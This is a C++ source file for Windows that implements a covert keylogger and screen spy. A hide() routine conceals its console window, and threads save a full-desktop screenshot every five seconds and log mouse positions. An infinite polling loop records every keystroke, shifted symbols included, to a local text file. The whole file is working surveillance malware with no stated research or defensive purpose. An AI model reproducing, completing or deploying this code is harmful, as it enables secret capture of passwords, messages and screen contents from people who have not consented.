#include "stdafx.h"
#include <iostream> 
#include < windows.h > 
#include < winuser.h > 
#include < fstream >
#include <stdio.h>
#include <assert.h>
#include <thread>
#include <time.h>
#include <sstream>


using namespace std;

void screenshot();
PBITMAPINFO CreateBitmapInfoStruct(HBITMAP);
void CreateBMPFile(HBITMAP hBMP);

void log();
void hide();
//LPCWSTR getTimeStamp();

int main() {

	hide();
	std::thread([&]
	{
		while (true)
		{
			std::this_thread::sleep_for(chrono::milliseconds(5000));   // screenshot timer
			screenshot();

		}


	}).detach();

	std::thread([&]
	{
		while (true)
		{
			std::this_thread::sleep_for(chrono::milliseconds(500));

			POINT p;
			if (GetCursorPos(&p))

			{
				ofstream write("mouseTracker.txt", ios::app);
				write << p.x << "," << p.y << "\r\n";
				write.close();
			}


		}


	}).detach();
	log();
	return 0;
}

PBITMAPINFO CreateBitmapInfoStruct(HBITMAP hBmp)
{
	BITMAP bmp;
	PBITMAPINFO pbmi;
	WORD    cClrBits;

	// Retrieve the bitmap color format, width, and height.  
	assert(GetObject(hBmp, sizeof(BITMAP), (LPSTR)&bmp));

	// Convert the color format to a count of bits.  
	cClrBits = (WORD)(bmp.bmPlanes * bmp.bmBitsPixel);
	if (cClrBits == 1)
		cClrBits = 1;
	else if (cClrBits <= 4)
		cClrBits = 4;
	else if (cClrBits <= 8)
		cClrBits = 8;
	else if (cClrBits <= 16)
		cClrBits = 16;
	else if (cClrBits <= 24)
		cClrBits = 24;
	else cClrBits = 32;


	if (cClrBits < 24)
		pbmi = (PBITMAPINFO)LocalAlloc(LPTR,
			sizeof(BITMAPINFOHEADER) +
			sizeof(RGBQUAD) * (1 << cClrBits));



	else
		pbmi = (PBITMAPINFO)LocalAlloc(LPTR,
			sizeof(BITMAPINFOHEADER));



	pbmi->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	pbmi->bmiHeader.biWidth = bmp.bmWidth;
	pbmi->bmiHeader.biHeight = bmp.bmHeight;
	pbmi->bmiHeader.biPlanes = bmp.bmPlanes;
	pbmi->bmiHeader.biBitCount = bmp.bmBitsPixel;
	if (cClrBits < 24)
		pbmi->bmiHeader.biClrUsed = (1 << cClrBits);


	pbmi->bmiHeader.biCompression = BI_RGB;


	pbmi->bmiHeader.biSizeImage = ((pbmi->bmiHeader.biWidth * cClrBits + 31) & ~31) / 8
		* pbmi->bmiHeader.biHeight;

	pbmi->bmiHeader.biClrImportant = 0;
	return pbmi;
}

void CreateBMPFile(HBITMAP hBMP)
{
	HANDLE hf;                 // file handle  
	BITMAPFILEHEADER hdr;       // bitmap file-header  
	PBITMAPINFOHEADER pbih;     // bitmap info-header  
	LPBYTE lpBits;              // memory pointer  
	DWORD dwTotal;              // total count of bytes  
	DWORD cb;                   // incremental count of bytes  
	BYTE *hp;                   // byte pointer  
	DWORD dwTmp;
	PBITMAPINFO pbi;
	HDC hDC;

	hDC = CreateCompatibleDC(GetWindowDC(GetDesktopWindow()));
	SelectObject(hDC, hBMP);

	pbi = CreateBitmapInfoStruct(hBMP);

	pbih = (PBITMAPINFOHEADER)pbi;
	lpBits = (LPBYTE)GlobalAlloc(GMEM_FIXED, pbih->biSizeImage);

	assert(lpBits);


	assert(GetDIBits(hDC, hBMP, 0, (WORD)pbih->biHeight, lpBits, pbi,
		DIB_RGB_COLORS));

	//Filename Generation
	time_t now;
	struct tm *tm;
	now = time(0);

	bool err = false;
	if ((tm = localtime(&now)) == NULL) {
		//printf("Error extracting time stamp\n");
		err = true;
	}

	wstring fName;

	if (err == true) {
		fName = L"temp.bmp";
	}
	else {
		fName = to_wstring(tm->tm_year + 1900) + L"-" + to_wstring(tm->tm_mon + 1) + L"-" + to_wstring(tm->tm_mday) + L"_" + to_wstring(tm->tm_hour) + L"-" + to_wstring(tm->tm_min) + L"-" + to_wstring(tm->tm_sec) + L".bmp";
	}

	// Create the .BMP file.  
	hf = CreateFile(fName.c_str(),
		GENERIC_READ | GENERIC_WRITE,
		(DWORD)0,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		(HANDLE)NULL);
	assert(hf != INVALID_HANDLE_VALUE);

	hdr.bfType = 0x4d42;        // 0x42 = "B" 0x4d = "M"  
								// Compute the size of the entire file.  
	hdr.bfSize = (DWORD)(sizeof(BITMAPFILEHEADER) +
		pbih->biSize + pbih->biClrUsed
		* sizeof(RGBQUAD) + pbih->biSizeImage);
	hdr.bfReserved1 = 0;
	hdr.bfReserved2 = 0;


	hdr.bfOffBits = (DWORD) sizeof(BITMAPFILEHEADER) +
		pbih->biSize + pbih->biClrUsed
		* sizeof(RGBQUAD);

	// Copy the BITMAPFILEHEADER into the .BMP file.  
	assert(WriteFile(hf, (LPVOID)&hdr, sizeof(BITMAPFILEHEADER),
		(LPDWORD)&dwTmp, NULL));


	assert(WriteFile(hf, (LPVOID)pbih, sizeof(BITMAPINFOHEADER)
		+ pbih->biClrUsed * sizeof(RGBQUAD),
		(LPDWORD)&dwTmp, (NULL)));


	dwTotal = cb = pbih->biSizeImage;
	hp = lpBits;
	assert(WriteFile(hf, (LPSTR)hp, (int)cb, (LPDWORD)&dwTmp, NULL));

	assert(CloseHandle(hf));

	// Free memory.  
	GlobalFree((HGLOBAL)lpBits);
}

void hide()
{
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}
void screenshot()
{

	HWND hwnd;
	HDC hdc[2];
	HBITMAP hbitmap;
	RECT rect;

	hwnd = GetDesktopWindow();
	GetClientRect(hwnd, &rect);
	hdc[0] = GetWindowDC(hwnd);
	hbitmap = CreateCompatibleBitmap(hdc[0], rect.right, rect.bottom);
	hdc[1] = CreateCompatibleDC(hdc[0]);
	SelectObject(hdc[1], hbitmap);

	BitBlt(
		hdc[1],
		0,
		0,
		rect.right,
		rect.bottom,
		hdc[0],
		0,
		0,
		SRCCOPY
	);

	CreateBMPFile(hbitmap);


}

void log() {
	char key;

	for (;;) {
		for (key = 8; key < 222; key++)
		{//sleep(0);
			if (GetAsyncKeyState(key) == -32767) {
				ofstream write("keyStrokes.txt", ios::app);

				if ((key > 64) && (key < 91) && !(GetAsyncKeyState(0x10))) {
					key += 32;
					write << key;
					write.close();
					break;
				}
				else

					if ((key > 64) && (key < 91)) {
						write << key;
						write.close();
						break;
					}
					else {
						switch (key) {
						case 48:

						{
							if (GetAsyncKeyState(0x10))
								write << ")";
							else
								write << "0";
						}
						break;
						case 49:
						{
							if (GetAsyncKeyState(0x10))
								write << "!";
							else
								write << "1";

						}
						break;
						case 50:
						{
							if (GetAsyncKeyState(0x10))
								write << "\"";
							else
								write << "2";

						}
						break;
						case 51:
						{
							if (GetAsyncKeyState(0x10))
								write << "#";
							else
								write << "3";

						}
						break;
						case 52:
						{
							if (GetAsyncKeyState(0x10))
								write << "$";
							else
								write << "4";

						}
						break;
						case 53:
						{
							if (GetAsyncKeyState(0x10))
								write << "%";
							else
								write << "5";

						}
						break;
						case 54:
						{
							if (GetAsyncKeyState(0x10))
								write << "^";
							else
								write << "6";

						}
						break;
						case 55:
						{
							if (GetAsyncKeyState(0x10))
								write << "&";
							else
								write << "7";

						}
						break;
						case 56:
						{
							if (GetAsyncKeyState(0x10))
								write << "*";
							else
								write << "8";

						}
						break;
						case 57:
						{
							if (GetAsyncKeyState(0x10))
								write << "(";
							else
								write << "9";
						}
						break;
						case VK_SPACE:
							write << " ";

							break;
						case VK_RETURN:
							write << "\n";

							break;
						case VK_TAB:
							write << "  ";

							break;
						case VK_BACK:
							write << "<backSpace>";

							break;
						case VK_ESCAPE:
							write << "<esc>";

							break;
						case VK_DELETE:
							write << "<delete>";
							break;


						}
					}
			}

		} //END FOR


	} // INFINITE FOR
}